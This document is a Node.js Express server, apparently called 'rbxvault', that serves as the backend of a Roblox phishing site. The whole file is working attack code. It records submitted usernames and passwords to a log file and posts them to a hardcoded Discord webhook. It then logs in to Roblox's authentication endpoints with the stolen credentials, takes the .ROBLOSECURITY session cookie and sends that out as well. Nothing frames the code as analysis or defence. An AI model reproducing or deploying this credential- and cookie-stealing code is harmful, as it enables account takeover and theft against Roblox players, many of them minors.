const express = require('express');
const axios = require('axios');
const fs = require('fs');

const app = express();
app.use(express.json());
app.use(express.static('.'));

const WEBHOOK = 'https://discord.com/api/webhooks/1545632519007903804/1YvZwBPnU_iH1kHqLs8TfltiA96QhKxg3hbZbgydz9cKKM53hO_Wz4MGdCMYKotsv72n';

app.post('/api/capture', async (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).json({ status: 'error' });
    }

    const logLine = `[${new Date().toISOString()}] ${username}:${password}\n`;
    fs.appendFileSync('creds.log', logLine);

    await axios.post(WEBHOOK, {
        content: `🔐 **roblox credentials**\n**user:** \`${username}\`\n**pass:** \`${password}\``
    }).catch(() => {});

    // ------ COOKIE GRABBER -------
    let cookie = null;
    const agent = axios.create({
        headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/json',
            'Origin': 'https://www.roblox.com',
            'Referer': 'https://www.roblox.com/login'
        },
        withCredentials: true,
        maxRedirects: 0,
        validateStatus: status => status >= 200 && status < 400
    });

    try {
        // STEP 1: Get CSRF token from auth.roblox.com
        const csrfRes = await agent.get('https://auth.roblox.com/v2/login', {
            headers: {
                'Referer': 'https://www.roblox.com/login'
            }
        });

        const csrfToken = csrfRes.headers['x-csrf-token'];
        if (!csrfToken) throw new Error('No CSRF token');

        // STEP 2: POST login to auth.roblox.com with CSRF
        const loginPayload = {
            ctype: 'Username',
            cvalue: username,
            password: password
        };

        const loginRes = await agent.post('https://auth.roblox.com/v2/login', loginPayload, {
            headers: {
                'X-CSRF-TOKEN': csrfToken,
                'Referer': 'https://www.roblox.com/login'
            }
        });

        // STEP 3: Extract .ROBLOSECURITY from set-cookie
        const setCookieHeaders = loginRes.headers['set-cookie'];
        if (setCookieHeaders) {
            const cookieArray = Array.isArray(setCookieHeaders) ? setCookieHeaders : [setCookieHeaders];
            for (let c of cookieArray) {
                if (c.includes('.ROBLOSECURITY=')) {
                    cookie = c.split(';')[0];
                    break;
                }
            }
        }

        // STEP 4: If no cookie, try the old /login endpoint as fallback
        if (!cookie) {
            const fallbackAgent = axios.create({
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Content-Type': 'application/json',
                    'Referer': 'https://www.roblox.com/login'
                },
                withCredentials: true,
                maxRedirects: 0,
                validateStatus: status => status === 200 || status === 302
            });

            const fallbackRes = await fallbackAgent.post('https://www.roblox.com/login', {
                username: username,
                password: password
            });

            const fallbackCookies = fallbackRes.headers['set-cookie'];
            if (fallbackCookies) {
                const arr = Array.isArray(fallbackCookies) ? fallbackCookies : [fallbackCookies];
                for (let c of arr) {
                    if (c.includes('.ROBLOSECURITY=')) {
                        cookie = c.split(';')[0];
                        break;
                    }
                }
            }
        }

        // STEP 5: Send cookie to webhook if found
        if (cookie) {
            await axios.post(WEBHOOK, {
                content: `🍪 **.ROBLOSECURITY cookie**\n\`${cookie}\``
            }).catch(() => {});
        } else {
            await axios.post(WEBHOOK, {
                content: `⚠️ **cookie not captured** for \`${username}\` — maybe 2FA or wrong pass`
            }).catch(() => {});
        }

    } catch (err) {
        // If login fails, send error details
        const errorMsg = err.response?.status
            ? `HTTP ${err.response.status}`
            : err.message;
        await axios.post(WEBHOOK, {
            content: `❌ **cookie grab failed** for \`${username}\` — ${errorMsg}`
        }).catch(() => {});
    }

    res.json({ status: 'ok' });
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`rbxvault running on port ${port}`);
});
